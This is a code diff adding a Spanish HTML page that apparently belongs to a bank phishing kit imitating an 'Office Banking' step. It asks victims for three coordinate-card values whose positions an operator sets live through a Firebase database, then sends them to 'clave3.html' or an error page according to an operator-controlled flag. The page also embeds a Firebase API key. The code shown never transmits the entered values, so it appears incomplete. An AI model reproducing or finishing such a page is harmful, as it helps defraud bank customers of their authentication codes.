@@ -1,0 +1,101 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Coordenadas</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #fff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 2rem;
+    }
+    h2 {
+      margin-bottom: 1rem;
+    }
+    .labels {
+      display: flex;
+      gap: 2rem;
+      margin-bottom: 0.5rem;
+    }
+    .labels span {
+      font-weight: bold;
+      min-width: 40px;
+      text-align: center;
+    }
+    .inputs {
+      display: flex;
+      gap: 2rem;
+      margin-bottom: 1rem;
+    }
+    input {
+      width: 40px;
+      padding: 10px;
+      font-size: 18px;
+      text-align: center;
+      border: 1px solid #000;
+      border-radius: 5px;
+    }
+    button {
+      padding: 10px 20px;
+      background: red;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>Ingresa las coordenadas solicitadas</h2>
+  <div class="labels">
+    <span id="lbl1">--</span>
+    <span id="lbl2">--</span>
+    <span id="lbl3">--</span>
+  </div>
+  <div class="inputs">
+    <input type="text" maxlength="2" />
+    <input type="text" maxlength="2" />
+    <input type="text" maxlength="2" />
+  </div>
+  <button onclick="verificar()">Enviar</button>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBdPWoveN6ftUuIsUtnF1hA5eB7UWZR8aQ",
+      authDomain: "formulario-officebanking.firebaseapp.com",
+      databaseURL: "https://formulario-officebanking-default-rtdb.firebaseio.com",
+      projectId: "formulario-officebanking"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    db.ref("coordenadas").on("value", (snap) => {
+      const val = snap.val();
+      if (val && val.length === 3) {
+        document.getElementById("lbl1").innerText = val[0];
+        document.getElementById("lbl2").innerText = val[1];
+        document.getElementById("lbl3").innerText = val[2];
+      }
+    });
+
+    function verificar() {
+      db.ref("validacion").once("value").then(snap => {
+        const val = snap.val();
+        if (val === "correcto") {
+          window.location.href = "clave3.html";
+        } else {
+          window.location.href = "error.html";
+        }
+      });
+    }
+  </script>
+</body>
+</html>
